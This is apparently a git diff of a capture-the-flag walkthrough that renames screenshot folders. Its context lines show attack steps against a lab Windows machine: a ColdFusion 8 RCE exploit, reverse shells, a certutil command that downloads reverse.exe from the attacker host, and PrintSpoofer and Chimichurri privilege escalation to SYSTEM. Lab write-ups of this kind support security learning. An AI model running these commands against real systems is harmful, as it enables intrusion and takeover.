@@ -42,11 +42,11 @@ the Machine is running a web self-hosted service that we can check out
 
 after connecting to the url we have this page in front of us
 
-![](Screen/Pasted%20image%2020260429160823.png)
+![](screen/Pasted%20image%2020260429160823.png)
 
 while checking the page i land on a login page
 
-![](Screen/Pasted%20image%2020260429161159.png)
+![](screen/Pasted%20image%2020260429161159.png)
 
 reading the title of the login page seems the versionn this app is running is the 8, searching online i found this RCE exploit for this version
 
@@ -74,7 +74,7 @@ sudo ./CVE-2009-2265 -l 10.10.15.54 -p 4444 -r 10.129.28.78 -q 8500
 
 and after a short time we get a reverse shell
 
-![](Screen/Pasted%20image%2020260429162745.png)
+![](screen/Pasted%20image%2020260429162745.png)
 
 the connection was not stable at all so i run another listener with the port 4445 and on the reverse shell i ran a PowerShell command to another reverse shell, i used this site to make the reverse shell command
 
@@ -94,7 +94,7 @@ whoami /priv
 
 output:
 
-![](Screen/Pasted%20image%2020260429163952.png)
+![](screen/Pasted%20image%2020260429163952.png)
 
 we have a SeImpersonatePrivilage privilage wich is an escaletion vector with the PrintSpoofer exploit, i created a meterpeter shell and uploaded on the machine
 
@@ -131,7 +131,7 @@ certutil.exe -urlcache -f http://10.10.15.54:9090/reverse.exe reverse.exe
 
 and after a short time we get a call back
 
-![](Screen/Pasted%20image%2020260429170059.png)
+![](screen/Pasted%20image%2020260429170059.png)
 
 the getsystem command failed so i continued enumerating the machine, so after a bit of research i found a site where it explains the different type Kernel Exploits for Windows
 
@@ -158,4 +158,4 @@ Chimichurri.exe 10.10.15.54 4448
 
 and we get a callback as system
 
-![](Screen/Pasted%20image%2020260429185528.png)
+![](screen/Pasted%20image%2020260429185528.png)
